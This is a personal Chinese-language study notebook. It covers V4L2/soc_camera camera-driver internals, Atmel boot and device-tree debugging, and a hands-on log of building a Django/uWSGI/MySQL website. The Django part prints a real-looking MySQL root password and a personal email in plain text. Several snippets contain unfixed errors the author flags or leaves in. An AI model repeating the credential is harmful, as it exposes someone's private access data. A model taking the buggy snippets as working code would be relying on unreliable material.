4、视频间隔消隐信号接口(VBI interface)：它可以使应用可以访问传输消隐期的视频信号；
5、收音机接口(radio interface)：可用来处理从AM或FM高频头设备接收来的音频流；

下面从一个例子分析 v4l2
soc_camera是一个平台总线设备,
但与其他传统平台总线设备有些区别, 它不像是硬件总线控制器设备, 更像是一个具体的设备
但也是一个基于 v4l2 的 模块化视频采集设备 (之所以说是模块化是因为统一的操作策略,而摄像头的硬件操作分离出来,即可简单更换移植各种摄像头)
基于 v4l2 的视频采集设备 首先有 v4l2_file_operations 操作集!!(soc_camera.c里)
static struct v4l2_file_operations soc_camera_fops = {
	.owner		= THIS_MODULE,
	.open		= soc_camera_open,
	.release	= soc_camera_close,
	.unlocked_ioctl	= video_ioctl2,
	.read		= soc_camera_read,
	.mmap		= soc_camera_mmap,
	.poll		= soc_camera_poll,
}; 
还有 v4l2_ioctl_ops 对应ioctl操作的 操作函数集	(soc_camera.c里)
static const struct v4l2_ioctl_ops soc_camera_ioctl_ops = {
	.vidioc_querycap	 = soc_camera_querycap,
	.vidioc_try_fmt_vid_cap  = soc_camera_try_fmt_vid_cap,
	.vidioc_g_fmt_vid_cap    = soc_camera_g_fmt_vid_cap,
	.vidioc_s_fmt_vid_cap    = soc_camera_s_fmt_vid_cap,
	.vidioc_enum_fmt_vid_cap = soc_camera_enum_fmt_vid_cap,
	.vidioc_enum_input	 = soc_camera_enum_input,
	.vidioc_g_input		 = soc_camera_g_input,
	.vidioc_s_input		 = soc_camera_s_input,
	.vidioc_s_std		 = soc_camera_s_std,
	.vidioc_g_std		 = soc_camera_g_std,
	.vidioc_enum_framesizes  = soc_camera_enum_framesizes,
	.vidioc_reqbufs		 = soc_camera_reqbufs,
	.vidioc_querybuf	 = soc_camera_querybuf,
	.vidioc_qbuf		 = soc_camera_qbuf,
	.vidioc_dqbuf		 = soc_camera_dqbuf,
	.vidioc_create_bufs	 = soc_camera_create_bufs,
	.vidioc_prepare_buf	 = soc_camera_prepare_buf,
	.vidioc_expbuf		 = soc_camera_expbuf,
	.vidioc_streamon	 = soc_camera_streamon,
	.vidioc_streamoff	 = soc_camera_streamoff,
	.vidioc_cropcap		 = soc_camera_cropcap,
	.vidioc_g_crop		 = soc_camera_g_crop,
	.vidioc_s_crop		 = soc_camera_s_crop,
	.vidioc_g_selection	 = soc_camera_g_selection,
	.vidioc_s_selection	 = soc_camera_s_selection,
	.vidioc_g_parm		 = soc_camera_g_parm,
	.vidioc_s_parm		 = soc_camera_s_parm,
};
还有的 是一个视频基类结构 是一个实质的采集设备对象!!!比如这样:
static struct video_device soc_camera1 = {
	.name		= "soc_camera1",
	.fops           = &soc_camera_fops,
	.ioctl_ops 	= &soc_camera_ioctl_ops,
	....
};
然而实际实际上 这些对象是实际注册时自动生成的,而不是既定的,比如通过这个函数生成 video_dev_create() (soc_camera.c里)
然后,介绍 soc_camera 的设备结构体:
struct soc_camera_device {
	struct list_head list;		//设备所在的内核双向链表
	struct soc_camera_desc *sdesc;
	struct device *pdev;		/* Platform device */
	struct device *parent;		/* Camera host device */
	struct device *control;		/* E.g., the i2c client */
	s32 user_width;
	s32 user_height;
	u32 bytesperline;		/* for padding, zero if unused */
	u32 sizeimage;
	enum v4l2_colorspace colorspace;
	unsigned char iface;		/* Host number */
	unsigned char devnum;		/* Device number per host */
	struct soc_camera_sense *sense;	/* See comment in struct definition */
	struct video_device *vdev;	 //指向具体的 视频基类结构 的某设备对象,也是 soc_camera_device结构对象的 核心项
	struct v4l2_ctrl_handler ctrl_handler;
	const struct soc_camera_format_xlate *current_fmt;
	struct soc_camera_format_xlate *user_formats;
	int num_user_formats;
	enum v4l2_field field;		/* Preserve field over close() */
	void *host_priv;		/* Per-device host private data */
	/* soc_camera.c private count. Only accessed with .host_lock held */
	int use_count;
	struct file *streamer;		/* stream owner */
	struct v4l2_clk *clk;
	/* Asynchronous subdevice management */
	struct soc_camera_async_client *sasc;
	/* video buffer queue */
	union {
		struct videobuf_queue vb_vidq;
		struct vb2_queue vb2_vidq;
	};
};
上述是 基于 v4l2 框架 移植过来的 视频采集设备的基本内容和结构
当然根据实际需求,还有一些深层的封装,例如:
struct soc_camera_host {
	struct v4l2_device v4l2_dev;
	struct list_head list;
	struct mutex host_lock;		/* Main synchronisation lock */
	struct mutex clk_lock;		/* Protect pipeline modifications */
	unsigned char nr;		/* Host number */
	u32 capabilities;
	struct soc_camera_device *icd;	/* Currently attached client */
	void *priv;
	const char *drv_name;
	struct soc_camera_host_ops *ops;
	struct v4l2_async_subdev **asd;	/* Flat array, arranged in groups */
	unsigned int *asd_sizes;	/* 0-terminated array of asd group sizes */
};
这里的host,我怀疑指的是isi总线!!!

驱动与应用程序的数据传输方式有三种:
1）read与write这种方式，它像其它设备驱动一样，但是这种方式很慢，对于数据视频流不能满足其要求；
2）直接的内存访问，可以通过其映射方式来传输(IO数据流，交换指向缓冲区指针的方法)；
   这是视频设备通常用的方法，采用mmap()的方法，即有内核空间里开辟内存，再在程序里把这部分的内存映射到程序空间。
   如果有设备内存，即直接映射到设备的内核，这种性能更高。
3）反过来,用户态申请的内存隐射到内核里被使用!!!
soc_camera 使用了 第二种方法, 把内核态分出的内存隐射出来让用户程序也可以操作
soc_camera_mmap 干了这事,特别是:
videobuf_mmap_mapper(&fh->vb_vidq, vma);  这个核心函数把设备的I/O内存或者设备内存映射到系统为它开辟的虚拟内存。

操控设备的实现: ioctl
long video_ioctl2(struct file *file, unsigned int cmd, unsigned long arg)
{
	return video_usercopy(file, cmd, arg, __video_do_ioctl);
}
__video_do_ioctl 这个函数里调用一些命令来设备V4L2模块中的一些结构参数来改变或者获取设备的参数。
一般使用ioctl函数来对设备的I/O通道进行管理：
	extern int ioctl (int __fd, unsigned long int __request, ...) __THROW;
	__fd：设备的ID，例如刚才用open函数打开视频通道后返回的cameraFd；
	__request：具体的命令标志符。
在进行V4L2开发中，一般会用到以下的命令标志符：
	VIDIOC_REQBUFS：分配内存 
	VIDIOC_QUERYBUF：把VIDIOC_REQBUFS中分配的数据缓存转换成物理地址 
	VIDIOC_QUERYCAP：查询驱动功能 
	VIDIOC_ENUM_FMT：获取当前驱动支持的视频格式 
	VIDIOC_S_FMT：设置当前驱动的频捕获格式 
	VIDIOC_G_FMT：读取当前驱动的频捕获格式 
	VIDIOC_TRY_FMT：验证当前驱动的显示格式 
	VIDIOC_CROPCAP：查询驱动的修剪能力 
	VIDIOC_S_CROP：设置视频信号的边框 
	VIDIOC_G_CROP：读取视频信号的边框 
	VIDIOC_QBUF：把缓存放入缓存队列 
	VIDIOC_DQBUF：把缓存从缓存队列中取出来 
	VIDIOC_STREAMON：开始视频显示函数 
	VIDIOC_STREAMOFF：结束视频显示函数 
	VIDIOC_QUERYSTD：检查当前视频设备支持的标准，例如PAL或NTSC。 
	这些IO调用，有些是必须的，有些是可选择的。

struct v4l2_subdev  在这里一般就是,视频采集设备里子功能设备,如编解码器,声色子功能等等 一般都使用I2C控制 !!!
重点结构体:
/* kernel/include/media/v4l2-subde.h */
struct v4l2_subdev {
#if defined(CONFIG_MEDIA_CONTROLLER)
    struct media_entity entity;
#endif
    struct list_head list;
    struct module *owner;
    u32 flags;
    struct v4l2_device *v4l2_dev;
    const struct v4l2_subdev_ops *ops;    // 各种策略的ops
    /* Never call these internal ops from within a driver! */
    const struct v4l2_subdev_internal_ops *internal_ops;
    /* The control handler of this subdev. May be NULL. */
    struct v4l2_ctrl_handler *ctrl_handler;
    /* name must be unique */
    char name[V4L2_SUBDEV_NAME_SIZE];
    /* can be used to group similar subdevs, value is driver-specific */
    u32 grp_id;
    /* pointer to private data */
    void *dev_priv;
    void *host_priv;
    /* subdev device node */
    struct video_device devnode;
    /* number of events to be allocated on open */
    unsigned int nevents;
};
struct v4l2_subdev_ops {
    const struct v4l2_subdev_core_ops    *core;    // 所有sub-device通用
    const struct v4l2_subdev_tuner_ops    *tuner;
    const struct v4l2_subdev_audio_ops    *audio;
    const struct v4l2_subdev_video_ops    *video;
    const struct v4l2_subdev_vbi_ops    *vbi;
    const struct v4l2_subdev_ir_ops        *ir;
    const struct v4l2_subdev_sensor_ops    *sensor;
    const struct v4l2_subdev_pad_ops    *pad;
};
ops的调用:
1. 直接调用：
	err = sd->ops->core->g_chip_ident(sd, &chip);
2. 宏调用
	err = v4l2_subdev_call(sd, core, g_chip_ident, &chip);
#define v4l2_subdev_call(sd, o, f, args...)                \
    (!(sd) ? -ENODEV : (((sd)->ops->o && (sd)->ops->o->f) ?    \
        (sd)->ops->o->f((sd) , ##args) : -ENOIOCTLCMD))
/*
　　宏调用优点：1. 对sd是否为空的检测
　　　　　　   2. 调用函数f所在的ops是否为空的检测
　　          3. 调用函数f是否为空的检测
　　　　　　   4. 调用是被返回负值，成功返回函数f的返回值
*/

soc_camera 里的函数:
soc_camera_expbuf() 把buf 模拟成一个暂时文件,输出这个文件的文件描述符
soc_camera_init_user_formats ????
soc_camera_add_device(icd) 只是 加到抽象的 host 对象里 
__soc_camera_power_on 重点是: ret = v4l2_subdev_call(sd, core, s_power, 1);
soc_camera_poll ???轮询??
v4l2_ctrl_add_handler ???
scan_async_xxx 什么的,似乎我们并没有使用!!!	

atmel_isi.c 
fb 是 frame buffer
fbd 是 frame buffer descriptor
isc 是 isi 低版本的 图像通讯硬件协议

为了掌握 驱动`的执行情况,我使用了dump_stack 来追溯
发现 atmel_isi 也是在 soc_camera 下工作





20170710
microchip学习:
	FPU:浮点运算单元!!
	emmc 与 nandflash 的区别: emmc 是集成了控制器的nandflash,
		数据内容放入nandflash时,单单是nandflash,时,要人工指定地址段,而emmc则自己安排地址,用户不用管
	
atmel MPU启动:
	rom-coder固化程序:启动时钟,枚举用户程序所在地方: emmc nandflash sdcard...,没有则启动 samba-morritor
		假如 枚举到是nandflash,就会把nandflash的开始地址的 bootloader放入sram执行
	bootloader 会初始化 ddram 等等,然后把uboot拷到ddram(ddram是sdram的一种)
	uboot 初始化 linux 环境,并跳入linux初始化

fat 的文件分区表是在开头位置, 而yaff,ubi文文件分区表是分布式的,linux之所以不用fat文件系统格式是因为flash有读写次数
如果使用fat 那么统一位置的分区表大量写,很快就挂掉了!!而分布的,分摊了写次数,延长寿命

上电: 外设先上,然后再核心上!!

devicetree 补充学习: dts_debug 案例
# ls /proc/device-tree/
#address-cells	clocks
#size-cells
compatible
ahb
cpus
aliases
fixedregulator@0
chosen
fixedregulator@1
gpio_keys
interrupt-parent
leds
memory
model
name
sram@00210000

# ls /proc/device-tree/ahb/apb/mmc@fc000000/
#address-cells compatible
#size-cells
dma-names
pinctrl-0
clock-names
dmas
pinctrl-names
clocks
interrupts
reg
name
slot@0
status
vmmc-supply
vqmmc-supply

# cat /proc/device-tree/ahb/apb/mmc@fc000000/status
okay

# cat /proc/device-tree/ahb/apb/mmc@fc000000/compatible
atmel,hsmci

# cat /proc/device-tree/ahb/apb/mmc@fc000000/clocks
G

# ls /sys/kernel/debug/pinctrl/ahb\:apb\:pinctrl@fc06a000/
gpio-ranges
pinconf-groups
pingroups
pinmux-pins
pinconf-config
pinconf-pins
pinmux-functions
pins

# cat /sys/kernel/debug/pinctrl/ahb\:apb\:pinctrl@fc06a000/pinconf-pins
Pin config settings per pin
Format: pin (name): configs
pin 0 (pioA0):PULL_UP
pin 128 (pioE0):PULL_DOWN
pin 129 (pioE1):PULL_UP|DEGLITCH

# cat /sys/kernel/debug/pinctrl/ahb\:apb\:pinctrl@fc06a000/pinmux-pins
Pinmux settings per pin
Format: pin (name): mux_owner gpio_owner hog?
pin 0 (pioA0): (MUX UNCLAIMED) (GPIO UNCLAIMED)
pin 30 (pioA30): f8014000.i2c (GPIO UNCLAIMED) function i2c0 group i2c0-0
pin 31 (pioA31): f8014000.i2c (GPIO UNCLAIMED) function i2c0 group i2c0-0
pin 67 (pioC3): (MUX UNCLAIMED) fc06c000.gpio:67
pin 131 (pioE3): fc000000.mmc fc06d000.gpio:131 function board group mmc1_cd

# ls /sys/kernel/debug/pinctrl/fc038000.pinctrl/
gpio-ranges
pinconf-groups pingroups
pinconf-config pinconf-pins
pinmux-functions
pinmux-pins
pins

# cat /sys/kernel/debug/pinctrl/fc038000.pinctrl/pinconf-pins
Pin config settings per pin
Format: pin (name): configs
pin 0 (PA0): (sdmmc0_default, ioset 1)
pin 1 (PA1): (sdmmc0_default, ioset 1) pull-up
pin 39 (PB7): (pinctrl_mxt_irq, ioset 0) pull-up debounce

# cat /sys/kernel/debug/pinctrl/fc038000.pinctrl/pinmux-pins
Pinmux settings per pin
Format: pin (name): mux_owner gpio_owner hog?
pin 0 (PA0): a0000000.sdio-host (GPIO UNCLAIMED) function A group PA0
pin 41 (PB9): gpio_keys (GPIO UNCLAIMED) function GPIO group PB9

# cat /sys/kernel/debug/clk/clk_summary
[20/1851]
clock				enable_cnt 	prepare_cnt	rate		accuracy	phase
----------------------------------------------------------------------------------------------------------
slow_rc_osc			0 		0 		32768 		250000000 	0
main_rc_osc 			0 		0 		12000000 	100000000 	0
clock				0		0		12000000	0		0
adc_op_clk			1		1		1000000		0 		0
main_xtal			1		1		12000000	0 		0
   main_osc			1		1		12000000	0 		0
      mainck			2		2		12000000	0 		0
         utmick			2		2		480000000	0 		0
            usbck		1		1		48000000	0 		0
               udpck		0		0		48000000	0 		0
               uhpck		1		1		48000000	0 		0
         pllack			1		1 		1200000000	0 		0
            plladivck		1		1		600000000	0 		0
               smdclk		0		0		600000000	0 		0
                  smdck		0		0		600000000	0 		0
               masterck		5		5		200000000	0 		0
                  isi_clk	0		0		200000000	0 		0
                  lcdc_clk	0		0		200000000	0 		0
                  dma1_clk	1		1		200000000	0 		0
                  vdec_clk	0		0		200000000	0 		0
                  matrix0_clk	0		0		200000000	0 		0
                  mpddr_clk	1		1		200000000	0 		0









20170713
德沃 SAM4S 板子
	1,PIR 例子中似乎并没有做 UVC例子,需要移植,大大麻烦
	2,似乎使用ek 而非PIR例子指定开发板, 所以摄像头,需要自己画板子!!! 大麻烦
	3,未知用ek 还是 PIR-DEMO板子
	












20170714
建立个人网站!!!!!!!! 用python
预备:
	pc新建项目目录 selfweb 并进入
建立独立环境:
	mkvirtualenv selfweb -p python2.7
	workon selfweb
安装环境包:
	pip install django 	//web框架
	pip install uwsgi	//服务端容器 对django友好
	小技巧:
	如果pip install 安装慢 ,可以用豆瓣的镜像!
	pip install django -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
建立github仓库:
	git init			//通过git init命令把当前目录变成Git可以管理的仓库
	登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库
	在Repository name填入selfweb，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库
	git remote add origin git@github.com:Kingders/selfweb.git 
		//在本地库learngit作为当前工作目录执行此命令，关联本地与远程仓库（通过ssh协议）
	git add readme
	git commit -m "first commit"
	git push -u origin master		//提交本地仓库到远程库
	出错: (由于使用新机器,还没有与我的github账号建立ssh连接)
	/*log start*/
	(selfweb) infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/selfweb$ git commit -m "first_commit"
	
	*** Please tell me who you are.
	
	Run
	
	  git config --global user.email "you@example.com"
	  git config --global user.name "Your Name"
	
	to set your account's default identity.
	Omit --global to set the identity only in this repository.
	
	fatal: unable to auto-detect email address (got 'infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR.(none)')
	(selfweb) infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/selfweb$ git push -u origin master
	The authenticity of host 'github.com (192.30.255.113)' can't be established.
	RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
	Are you sure you want to continue connecting (yes/no)? yes
	Warning: Permanently added 'github.com,192.30.255.113' (RSA) to the list of known hosts.
	Permission denied (publickey).
	fatal: Could not read from remote repository.
	
	Please make sure you have the correct access rights
	and the repository exists.
	(selfweb) infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/selfweb$ git push -u origin master
	Warning: Permanently added the RSA host key for IP address '192.30.255.112' to the list of known hosts.
	Permission denied (publickey).
	fatal: Could not read from remote repository.
	
	Please make sure you have the correct access rights
	and the repository exists.
	/*log end*/
	解决:建立ssh连接
	创建SSH Key
	$ ssh-keygen -t rsa -C "418128064@qq.com"	//ssh key 与机器相连，所以同一email，不同机子的ssh key 不一样
	Generating public/private rsa key pair.
	Enter file in which to save the key (/home/kl/.ssh/id_rsa):	//不填,回车直接默认
	Enter passphrase (empty for no passphrase): //不填,回车直接默认
	Enter same passphrase again: //不填,回车直接默认
	Your identification has been saved in /home/kl/ssh.	//可以不填，直接回车
	Your public key has been saved in /home/kl/ssh.pub.
	The key fingerprint is:
	36:1a:e1:5c:9d:13:7b:ce:0c:6f:72:b8:a9:b7:8a:0c 418128064@qq.com
	The key's randomart image is:
	+--[ RSA 2048]----+
	|          .      |
	|         . +     |
	|      . . * .    |
	|     o o   X     |
	|      + S o B    |
	|       + . *     |
	|    E .   o      |
	|     o . ..      |
	|      o oo..     |
	+-----------------+
	在/home/kl目录下得到ssh文件（私钥），ssh.pub文件（公钥）
	登陆GitHub，打开“Account settings”，“SSH Keys”页面
	点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的全部内容后，点“Add Key”，你就应该看到已经添加的Key	
	再次git push 出错: 
	git push -u origin master	//出错,由于没有pc端没有登陆账号!!!
	登陆账号
	git config --global user.email "418128064@qq.com"
	git config --global user.name "kingders"
	再次git push 成功!! 终于建立好 github仓库!!!
创建 django 工程
	django-admin startproject selfweb ~/selfweb
		自动创建manage.py文件(一个工具脚本，不需要修改)，
		自动创建工程总目录shareditor
			包含了配置文件settings.py、
			总路由配置urls.py、
			wsgi协议配置文件wsgi.py
在工程下创建 网站app
	django-admin startapp web
		自动创建web目录，并且自动帮我们组织了一些文件，包括：
			admin.py：数据库表的后台管理类一般定义在这里
			apps.py：这个app的配置信息，这个文件一般不动
			migrations目录：存储数据库迁移相关的临时文件，不需要动
			models.py：和数据库对应的model类一般定义在这里
			tests.py：自动化脚本
			views.py：视图层脚本，我一般会把控制逻辑写到这里
尝试执行:
	python manage.py runserver	//执行网站服务
	然后登陆 http://127.0.0.1:8000就可以访问网页了	
修改得 helloworld 例程(单进程,单线程)
	修改web/views.py (添加一个显示函数)	
		# by william 
		from django.http import HttpResponse
		
		def index(request):
		    return HttpResponse('hi my baby!')
	修改路由规则:修改selfweb/urls.py
		# by william
		from web import views
		
		urlpatterns = [
		    url(r'^admin/', admin.site.urls),
		    # by william
		    url(r'^$',views.index)
		]
	python manage.py runserver	//执行网站服务 然后登陆 http://127.0.0.1:8000测试
设置成比较专业的高并发网站:(多进程)
	建立selfweb/uwsgi.ini:
		[uwsgi]
		chdir = /home/infortech-ubuntu-1404/selfweb
		http = 127.0.0.1:8000
		http-keepalive = 1
		module = selfweb.wsgi:application
		master = ture
		processes = 5
		daemonize = /home/infortech-ubuntu-1404/selfweb/logs/uwsgi.log
		disable-logging = 1
		buffer-size = 16384
		harakiri = 5
		post-buffering = 8192
		post-buffering-bufsize = 65536
		pidfile = /home/infortech-ubuntu-1404/selfweb/logs/uwsgi.pid
		enable-threads = true
		single-interpreter = true
	上述是配置了一个web容器
	logs文件夹还没有,我们mkdir 一个
	然后执行 启动命令:
	uwsgi --ini selfweb/uwsgi.ini	//得到如下log:
	[uWSGI] getting INI configuration from selfweb/uwsgi.ini
	多进程 网站服务 已经在后台启动了!! 登陆 http://127.0.0.1:8000可测试
	ps ux|grep uwsgi 可以查看正在工作的进程
	关闭 uwsgi 启动的网站服务:
		killall -9 uwsgi
	扩展:(先不研究)
	另外为了让我们的网站具有高可用性(高可用就是挂掉一台机器不影响服务)，一台机器启动服务还不行，
	我们至少要部署两台完全对等的web服务来同时提供服务，
	那么用户在浏览器里访问时到底访问的是哪个机器呢？这里有两种实现方案，
	一种是配置DNS记录，同一个域名对应多个ip，那么当一个ip不可用时浏览器会自动尝试另外的ip，
	还有一种方法就是通过稳定的代理服务器(如nginx、apache httpd等)来配置成一个负载均衡代理，对外暴露的一个ip，对内连接到多台web服务器
	uwsg.ini 里要用绝对路径我去!!!
		ps ux | grep uwsgi //查看  uwsgi
		uwsgi : killall -9 uwsgi	//关闭uwsgi
加入数据库 mysql:
	先登陆数据库命令行处理界面
	mysql -u root -p	//以数据库root 登陆 后续提示填写root密码:362951847
		create database db_selfweb;	//每条命令要加";",这里建立一个数据库
	退出登陆数据库: ctrl+c
	配置工程连接这个数据库: 修改 selfweb/settings.py
		DATABASES = {
		    'default': {
		        # 'ENGINE': 'django.db.backends.sqlite3',
		        # 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
			# by william
		        'ENGINE': 'django.db.backends.mysql',
		        'NAME': 'db_selfweb',
		        'USER': 'root',
		        'PASSWORD': '362951847',
		        'HOST': '127.0.0.1',
		        'PORT': '3306',			//mysql默认的监听口,命令可查: ps -an | grep 3306
		        'OPTIONS': {
		            'sql_mode': 'traditional',
		        }
		    }
		}
	检查配置是否出错: python manage.py check
	出错: 没有加 python2 的 mysql 接口 Mysqldb
	解决: pip install MYSQL-python
	再检查:python manage.py check	//没出错 !!  System check identified no issues (0 silenced).
创建数据库model并自动生成数据库表
	model即定义了 一条数据含有的 内容项,遵从这个model的每条数据都是 这个model的实例,多个实例最终集中成一个数据表格
	我们在代码里操作model的实例其实就是在操作数据库
	修改 web/models.py
		# by william
		class BlogPost(models.Model):
		class BlogPost(models.Model):
		    title = models.CharField(max_length=255,verbose_name='文章标题')
		    body = models.TextField(verbose_name='文章内容')
		    create_time = models.DateTimeField(verbose_name='创建时间')
	其实就是定义了一个BlogPost的model了,接下来的事情,就是把我们定义的model转换成一个真正的mysql model,建立真正的BlogPost数据表
	修改 selfweb/settings.py
		INSTALLED_APPS = [
		    'django.contrib.admin',
		    'django.contrib.auth',
		    'django.contrib.contenttypes',
		    'django.contrib.sessions',
		    'django.contrib.messages',
		    'django.contrib.staticfiles',
		    # by william
		    'web',	//添加我们创建的web到默认安装的app里
		]
	python manage.py makemigrations		//更新migrate配置
	python manage.py migrate		//根据配置建立数据库表单!!
	然后登陆数据库看看:
		use db_selfweb;		//转到db_selfweb
		show tables;		//显示建立了的数据表单
		+----------------------------+
		| Tables_in_db_selfweb       |
		+----------------------------+
		| auth_group                 |
		| auth_group_permissions     |
		| auth_permission            |
		| auth_user                  |
		| auth_user_groups           |
		| auth_user_user_permissions |
		| django_admin_log           |
		| django_content_type        |
		| django_migrations          |
		| django_session             |
		| web_blogpost               |
		+----------------------------+
		11 rows in set (0.00 sec)
		看到了 web_blogpost 就是我们定义的 mysql 数据库表单
		而其他的是 django默认的建立的表单
数据库表 所谓的 一对多关系:(通过model 的联系理解)
	补充修改 web/models.py
		# by william
		class Subject(models.Model):
		    name = models.CharField(max_length=255,verbose_name='类别名称')
		    introduce = models.CharField(max_length=255,verbose_name='类别简介')
		    image = models.ImageField(verbose_name='类别图片')
		
		class BlogPost(models.Model):
		    title = models.CharField(max_length=255,verbose_name='文章标题')
		    body = models.TextField(verbose_name='文章内容')
		    create_time = models.DateTimeField(verbose_name='创建时间')
		    subject = models.ForeignKey(Subject,verbose_name='类别',null=True)
	python manage.py makemigrations		//更新migrate配置 这时出错,提示缺 pillow ,pip install 就好
	python manage.py migrate		//根据配置建立数据库表单!!
	然后登陆数据库看看:
		mysql -u root -p	//键入密码362951847
			use db_selfweb;
			show tables;
		除了web_blogpost 还有一个web_subject,
		而且 web_blogpost 里也多了一项 subject_id 的内容项,即照应blogpost 这个model 多了一个内容项
数据库表 所谓的 多对多关系:(通过model 的联系理解)
	给每篇blogpost 都添加标签
	在这里,标签是比类别还要特殊,这里例子的局限性认为,每篇文章只能被归类到一个类别里,但可以被贴上多个标签
	那么是问题来了,是不是要 给 blogpost 这个model 添加几个内容项?来存被贴上的多个标签?
	但是如果有些文章只被贴一个标签的话,多余的没用标签内容项让model看起来比较臃肿
	所以观察以下改变:
	补充修改 web/models.py
		# by william
		class Tag(models.Model):
		    name = models.CharField(max_length=255,verbose_name='标签名称')
		
		class Subject(models.Model):
		    name = models.CharField(max_length=255,verbose_name='类别名称')
		    introduce = models.CharField(max_length=255,verbose_name='类别简介')
		    image = models.ImageField(verbose_name='类别图片')
		
		class BlogPost(models.Model):
		    title = models.CharField(max_length=255,verbose_name='文章标题')
		    body = models.TextField(verbose_name='文章内容')
		    create_time = models.DateTimeField(verbose_name='创建时间')
		    subject = models.ForeignKey(Subject,verbose_name='类别',null=True)
		    tags = models.ManyToManyField(Tag,verbose_name='标签')
	python manage.py makemigrations		//更新migrate配置 
	python manage.py migrate		//根据配置建立数据库表单!!	
	然后登陆数据库看看:
		再多了一个web_tag, 和 web_blogpost_tags 数据表
		但是 web_blogpost 里并没有多了一项 关于tag 的内容项,即照应blogpost 这个model 的结构 并没有变化
		替代地 多出了一张 web_blogpost_tags 的新表 来记录 blogpost的每条数据实例与 tag 每条数据实例的关系
关于pycharm 这个IDE:
	先不管!!
强大的后台管理工具 django-admin (例子:在django-admin管理后台管理BlogPost、Subject、Tag这三个表)
	python manage.py createsuperuser	//创建管理者
	登陆http://127.0.0.1:8000/admin页面,可以进行相关管理
	修改web/admin.py:
	# by william
		from .models import BlogPost
		from .models import Subject
		from .models import Tag
		
		class BlogPostAdmin(admin.ModelAdmin):
		    list_display = ('title', 'create_time', 'subject', 'tags')
		
		class SubjectAdmin(admin.ModelAdmin):
		    list_display = ('name')
		
		class TagAdmin(admin.ModelAdmin):
		    list_display = ('name')
		
		admin.site.register(Tag,TagAdmin)
		admin.site.register(Subject,SubjectAdmin)
		admin.site.register(BlogPost,BlogPostAdmin)
	检查 python manage.py check //出现以下错误未解决
		SystemCheckError: System check identified some issues:
		
		ERRORS:
		<class 'web.admin.BlogPostAdmin'>: (admin.E109) The value of 'list_display[3]' must not be a ManyToManyField.
		<class 'web.admin.SubjectAdmin'>: (admin.E107) The value of 'list_display' must be a list or tuple.
		<class 'web.admin.TagAdmin'>: (admin.E107) The value of 'list_display' must be a list or tuple.
		
		System check identified 3 issues (0 silenced).
	上述错误未解决,但是不影响 http://127.0.0.1:8000/admin 出现 BlogPost、Subject、Tag 的选单
	按道理现在就可以点入,并添加 给这些数据库表单 添加一条条数据信息!!
	但是出错:
		勉强可以写入 BlogPost 的数据消息条,
		但是 Subject 和 Tag 连进去都失败,不行!!!
		直接错误为:
		AttributeError at /admin/web/subject/
		Unable to lookup 'n' on Subject or SubjectAdmin	
	问题解决:
	由于web/admin.py的书写格式错误,导致以上显示问题,实际上add 的数据消息条都成功建立:只是显示出问题:
	重写web/admin.py为:
		# -*- coding: utf-8 -*-
		from __future__ import unicode_literals
		
		from django.contrib import admin
		
		# Register your models here.
		
		# by william
		from .models import BlogPost
		from .models import Subject
		from .models import Tag
		
		class BlogPostAdmin(admin.ModelAdmin):
		    list_display = ('title', 'create_time', 'subject', 'tags')
		admin.site.register(BlogPost,BlogPostAdmin)
		
		class SubjectAdmin(admin.ModelAdmin):
		    list_display = ('name',)
		admin.site.register(Subject,SubjectAdmin)
		
		class TagAdmin(admin.ModelAdmin):
		    list_display = ('name',)
		admin.site.register(Tag,TagAdmin)
	重启网站服务器成功
管理界面的定制化
	页面顶部写的“Django administrator”换成“selfweb管理后台”，
		管理页面总标题因为是django-admin自身的内容，因此做定制有些复杂些，
		在根目录下创建如下目录templates/admin，
			mkdir templates
			mkdir templates/admin
		在里面新建base_site.html文件:(要注意全部用英文字符符号,否则出错)
			touch templates/admin/base_site.html
			内容如下:
			{% extends "admin/base.html"%}
			{% load i18n %}
			
			{% block title %}
			{{ title }} | {% trans "selfweb后台管理" %}
			{% endblock %}
			
			{% block branding %}
			<hi id="site_name">{% trans 'selfweb后台管理' %}</hi>
			{% endblock %}
			
			{% block nav-global %}
			{% endblock %}
		修改shareditor/settings.py，在TEMPLATES  =>  DIRS配置项中添加'templates'，
			TEMPLATES = [
			    {
			        'BACKEND': 'django.template.backends.django.DjangoTemplates',
			        'DIRS': [
			            'templates',
			        ],
			        'APP_DIRS': True,
			        'OPTIONS': {
			            'context_processors': [
			                'django.template.context_processors.debug',
			                'django.template.context_processors.request',
			                'django.contrib.auth.context_processors.auth',
			                'django.contrib.messages.context_processors.messages',
			            ],
			        },
			    },
			]			
	管理首页里的“WEB”改成“网站”，“Blog posts”改成“文章”，“Tag”改成“标签”，
		修改web/models.py:
		# by william
		class Tag(models.Model):
		    name = models.CharField(max_length=255,verbose_name='标签名称')
		    class Meta:
		        verbose_name_plural = '标签'
		    def __unicode__(self):
		        return self.name
		
		class Subject(models.Model):
		    name = models.CharField(max_length=255,verbose_name='类别名称')
		    introduce = models.CharField(max_length=255,verbose_name='类别简介')
		    image = models.ImageField(verbose_name='类别图片')
		    class Meta:
		        verbose_name_plural = '类别'
		    def _unicode_(self):
		        return self.name
		
		class BlogPost(models.Model):
		    title = models.CharField(max_length=255,verbose_name='文章标题')
		    body = models.TextField(verbose_name='文章内容')
		    create_time = models.DateTimeField(verbose_name='创建时间')
		    subject = models.ForeignKey(Subject,verbose_name='类别',null=True)
		    tags = models.ManyToManyField(Tag,verbose_name='标签')
		    class Meta:
		        verbose_name_plural = '文章'
		    def _unicode_(self):
		        return self.name
		这里的verbose_name_plural就是在这个结构在管理页面里的展示名称，
		__unicode__就是这个结构里每一个对象的展示形式，直接看一下你的管理页面的效果就知道了			
	另外我们在新建BlogPost的时候，
		类别和标签这两项里写的是“Subject object”和"Tag object"，都不知道具体信息，
		(未解决)
图片管理(要申请阿里云,整段未验证)
	我们在新建一个类别的时候要为image字段选择一张图片，
	我们看到图片实际上上传到了根目录下。这种方式存在一些问题：
